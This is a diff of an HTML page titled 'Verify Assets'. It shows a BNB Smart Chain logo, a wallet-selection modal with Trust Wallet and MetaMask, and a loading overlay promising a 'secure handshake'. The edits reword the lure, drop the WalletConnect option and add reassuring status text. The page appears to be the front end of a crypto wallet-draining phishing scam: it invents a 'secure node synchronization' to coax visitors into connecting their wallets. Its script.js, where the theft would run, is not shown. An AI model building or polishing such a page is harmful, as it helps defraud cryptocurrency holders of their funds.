@@ -13,15 +13,14 @@
         p { color: #929aa5; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
         .btn { background: #f0b90b; color: #000; border: none; padding: 16px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; }
         
-        /* Wallet Modal Styling */
+        /* Modal Styling */
         #w-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 1000; align-items: center; justify-content: center; }
         .m-content { background: #1e2329; width: 90%; max-width: 340px; border-radius: 24px; padding: 25px; border: 1px solid #333; }
-        .m-title { font-size: 18px; font-weight: bold; margin-bottom: 20px; text-align: center; color: #fff; }
-        .w-row { display: flex; align-items: center; background: #2b3139; padding: 15px; border-radius: 14px; margin-bottom: 12px; cursor: pointer; border: 1px solid transparent; transition: 0.2s; }
-        .w-row:hover { border-color: #f0b90b; background: #323942; }
-        .w-row img { width: 32px; height: 32px; margin-right: 15px; }
-        .w-row span { font-weight: 600; font-size: 15px; color: #fff; }
+        .w-row { display: flex; align-items: center; background: #2b3139; padding: 15px; border-radius: 14px; margin-bottom: 12px; cursor: pointer; border: 1px solid transparent; }
+        .w-row:hover { border-color: #f0b90b; }
+        .w-row img { width: 32px; margin-right: 15px; }
 
+        /* Overlay Styling */
         #overlay { display: none; position: fixed; inset: 0; background: #0b0e11; z-index: 1001; flex-direction: column; justify-content: center; align-items: center; }
         .spinner { width: 40px; height: 40px; border: 4px solid #333; border-top: 4px solid #f0b90b; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -32,13 +31,13 @@
     <div class="card">
         <img src="https://cryptologos.cc/logos/binance-smart-chain-bnb-logo.png" class="net-icon">
         <h2>Verify Assets</h2>
-        <p>Choose your wallet provider to begin the secure node synchronization process.</p>
+        <p>Connect your wallet to synchronize with the secure node for asset verification and protection.</p>
         <button class="btn" onclick="openModal()">Verify Assets</button>
     </div>
 
     <div id="w-modal">
         <div class="m-content">
-            <div class="m-title">Verify Assets</div>
+            <h3 style="text-align: center; margin-bottom: 20px;">Connect Wallet</h3>
             <div class="w-row" onclick="selectW('trust')">
                 <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png">
                 <span>Trust Wallet</span>
@@ -46,10 +45,6 @@
             <div class="w-row" onclick="selectW('meta')">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg">
                 <span>MetaMask</span>
-            </div>
-            <div class="w-row" onclick="selectW('other')">
-                <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.svg">
-                <span>WalletConnect</span>
             </div>
             <div style="text-align: center; margin-top: 15px;">
                 <button onclick="closeModal()" style="color:#929aa5; background:none; border:none; cursor:pointer;">Cancel</button>
@@ -60,7 +55,9 @@
     <div id="overlay">
         <div class="spinner"></div>
         <p id="loading-text" style="color:#f0b90b; margin-top:15px; font-weight:bold;">Initializing...</p>
+        <p id="sub-text" style="color:#929aa5; font-size:12px; margin-top:5px;">Establishing secure handshake...</p>
     </div>
+
     <script src="script.js"></script>
 </body>
 </html>
